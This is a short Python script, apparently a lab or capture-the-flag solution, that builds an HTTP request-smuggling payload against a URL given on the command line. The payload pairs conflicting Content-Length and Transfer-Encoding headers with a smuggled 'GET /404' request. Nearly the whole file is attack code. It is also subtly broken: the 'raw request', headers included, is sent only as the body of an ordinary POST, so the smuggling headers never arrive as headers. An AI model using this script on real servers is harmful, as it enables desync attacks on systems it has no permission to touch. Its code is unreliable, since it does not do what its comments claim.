import http.client
import sys

def send_smuggling_request(url):
    # Parse the URL to extract the host and path
    from urllib.parse import urlparse
    parsed_url = urlparse(url)
    host = parsed_url.netloc
    path = parsed_url.path or '/'

    # Create the raw request payload
    raw_request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 35\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"GET /404 HTTP/1.1\r\n"
        f"X-Ignore: X\r\n"
        f"\r\n"
    )

    # Send the raw request to the server
    conn = http.client.HTTPConnection(host)
    conn.request("POST", path, body=raw_request, headers={})
    response = conn.getresponse()
    print(response.status, response.reason)
    print(response.read().decode())

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

    target_url = sys.argv[1]
    send_smuggling_request(target_url)
